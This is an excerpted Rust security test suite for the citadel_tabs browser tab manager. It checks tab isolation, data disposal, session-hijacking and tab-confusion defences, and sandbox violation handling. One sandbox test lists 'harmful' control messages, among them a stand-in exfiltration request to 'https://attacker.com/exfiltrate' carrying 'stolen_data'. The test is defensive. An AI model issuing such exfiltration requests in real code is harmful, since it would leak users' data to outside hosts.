...
use citadel_tabs::{
    PageContent, SendSafeTabManager, SimpleTab, SimpleTabManager, Tab, TabError, TabResult,
    TabState, TabType,
};
...
mod test_utils {
    ...
    pub fn create_test_tab_state(url: &str, tab_type: TabType, is_active: bool) -> TabState {
        TabState {
            id: Uuid::new_v4(),
    ...
    pub async fn verify_tab_isolation(tab1_id: Uuid, tab2_id: Uuid, manager: &SendSafeTabManager) {
        ...
        if let (
            TabType::Container { container_id: id1 },
            TabType::Container { container_id: id2 },
...
mod tab_state_tests {
    ...
    fn test_tab_state_creation() {
        let tab_state = create_test_tab_state("https://example.com", TabType::Ephemeral, true);
    ...
    fn test_tab_state_serialization_security() {
        ...
        if let (
            PageContent::Loaded { content: orig, .. },
            PageContent::Loaded { content: deser, .. },
...
mod send_safe_tab_manager_tests {
    ...
    async fn test_zkvm_tab_creation() {
        ...
        let result = manager
            .open_tab("https://example.com".to_string(), TabType::Ephemeral)
            .await;
    ...
    async fn test_zkvm_tab_isolation() {
        ...
        let tab1_result = manager
            .open_tab("https://bank.com".to_string(), TabType::Ephemeral)
            .await;
        let tab2_result = manager
            .open_tab("https://social.com".to_string(), TabType::Ephemeral)
            .await;
        ...
        let sensitive_content = create_sensitive_page_content();
        let result = manager
            .update_page_content(tab1_id, sensitive_content.clone())
            .await;
        assert!(result.is_ok());
    ...
    async fn test_tab_switching_security() {
        ...
        // Create multiple tabs
        let tab1_id = manager
            .open_tab("https://site1.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        let tab2_id = manager
            .open_tab("https://site2.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
    ...
    async fn test_tab_closing_zkvm_cleanup() {
        ...
        let sensitive_content = create_sensitive_page_content();
        manager
            .update_page_content(tab_id, sensitive_content)
            .await
            .unwrap();
        ...
        let update_result = manager
            .update_page_content(tab_id, PageContent::Empty)
            .await;
    ...
    async fn test_zkvm_message_sending_security() {
        ...
        let result = manager
            .send_message_to_tab(tab_id, legitimate_message)
            .await;
        assert!(result.is_ok());
...
mod tab_isolation_tests {
    ...
    async fn test_memory_isolation_between_tabs() {
        ...
        let small_tab = manager
            .open_tab("https://simple.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        let large_tab = manager
            .open_tab("https://complex.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        ...
        manager
            .update_page_content(small_tab, small_content)
            .await
            .unwrap();
        manager
            .update_page_content(large_tab, large_content)
            .await
            .unwrap();
    ...
    async fn test_cross_tab_data_leakage_prevention() {
        ...
        let sensitive_tab = manager
            .open_tab("https://bank.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        let public_tab = manager
            .open_tab("https://news.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        ...
        let sensitive_content = create_sensitive_page_content();
        manager
            .update_page_content(sensitive_tab, sensitive_content)
            .await
            .unwrap();
        ...
        manager
            .update_page_content(public_tab, public_content)
            .await
            .unwrap();
        ...
        if let PageContent::Loaded {
            content: sensitive_content,
            ..
        } = &sensitive_state.content
        {
    ...
    async fn test_container_tab_isolation() {
        ...
        let container1 = manager
            .open_tab("https://app1.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        let container2 = manager
            .open_tab("https://app2.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        ...
        manager
            .update_page_content(container1, app1_content)
            .await
            .unwrap();
        manager
            .update_page_content(container2, app2_content)
            .await
            .unwrap();
    ...
    async fn test_ephemeral_tab_data_disposal() {
        ...
        let ephemeral_tab = manager
            .open_tab("https://temp.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        ...
        manager
            .update_page_content(ephemeral_tab, temp_sensitive_content)
            .await
            .unwrap();

        // Verify data exists
        let states_before = manager.get_tab_states();
        let state_before = states_before
            .iter()
            .find(|t| t.id == ephemeral_tab)
            .unwrap();
...
mod zkvm_security_tests {
    ...
    async fn test_zkvm_renderer_security() {
        ...
        let tab_id = manager
            .open_tab("https://test.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        ...
        assert!(
            result.is_ok(),
            "Should be able to send safe control messages"
        );
        ...
        assert!(
            ...
            "Should be able to send safe resource requests"
        );
    }
    ...
    async fn test_zkvm_sandbox_violation_handling() {
        ...
        let tab_id = manager
            .open_tab("https://malicious.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        ...
        let harmful_messages = vec![
            ...
            ChannelMessage::Control {
                ...
                params: r#"{"url": "https://attacker.com/exfiltrate", "data": "stolen_data"}"#
                    .to_string(),
            },
        ];
    ...
    async fn test_zkvm_memory_limits() {
        ...
        let tab_id = manager
            .open_tab("https://memory-test.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
    ...
    async fn test_zkvm_communication_timeout() {
        ...
        let tab_id = manager
            .open_tab("https://timeout-test.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
...
mod attack_scenario_tests {
    ...
    async fn test_tab_confusion_attack_prevention() {
        ...
        let legitimate_tab = manager
            .open_tab("https://bank.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        let malicious_tab = manager
            .open_tab("https://bank-phishing.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        ...
        manager
            .update_page_content(legitimate_tab, legitimate_content)
            .await
            .unwrap();
        manager
            .update_page_content(malicious_tab, malicious_content)
            .await
            .unwrap();
        ...
        let steal_result = manager
            .send_message_to_tab(malicious_tab, malicious_message)
            .await;

        // Either the message is rejected or it has no effect on the legitimate tab
        let updated_states = manager.get_tab_states();
        let updated_legit_state = updated_states
            .iter()
            .find(|t| t.id == legitimate_tab)
            .unwrap();
    ...
    async fn test_session_hijacking_prevention() {
        ...
        let session_tab = manager
            .open_tab("https://secure-app.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        ...
        manager
            .update_page_content(session_tab, session_content)
            .await
            .unwrap();

        // Create another tab that tries to access the session
        let attacker_tab = manager
            .open_tab("https://attacker.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        ...
        let hijack_result = manager
            .send_message_to_tab(attacker_tab, hijack_message)
            .await;
        ...
        } else if let PageContent::Loaded {
            content: attacker_content,
            ..
        } = &attacker_state.content
        {
    ...
    async fn test_privilege_escalation_prevention() {
        ...
        let unprivileged_tab = manager
            .open_tab("https://unprivileged.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        ...
        for attempt in escalation_attempts {
            ...
            let tab_states = manager.get_tab_states();
            let tab_state = tab_states
                .iter()
                .find(|t| t.id == unprivileged_tab)
                .unwrap();
            assert_eq!(tab_state.tab_type, TabType::Ephemeral);
    ...
    async fn test_resource_exhaustion_attack_prevention() {
        ...
        for i in 0..100 {
            let result = manager
                .open_tab(format!("https://site{}.com", i), TabType::Ephemeral)
                .await;
...
mod performance_security_tests {
    ...
    async fn test_tab_operation_timing() {
        ...
        let tab_id = manager
            .open_tab("https://timing-test.com".to_string(), TabType::Ephemeral)
            .await
            .unwrap();
        ...
        assert!(
            close_time.as_millis() < 500,
            "Tab closing too slow: {:?}",
            close_time
        );
    }
    ...
    async fn test_concurrent_tab_operations() {
        ...
        for tab_id in tab_ids {
            let manager_clone = manager.clone();
            let handle = tokio::spawn(async move { manager_clone.close_tab(tab_id).await });
    ...
    async fn test_memory_cleanup_on_tab_close() {
        ...
        manager
            .update_page_content(tab_id, large_content)
            .await
            .unwrap();
        ...
        let new_tab = manager
            .open_tab("https://new-test.com".to_string(), TabType::Ephemeral)
            .await;
        assert!(
            new_tab.is_ok(),
            "Should be able to create new tab after cleanup"
        );
    }
}
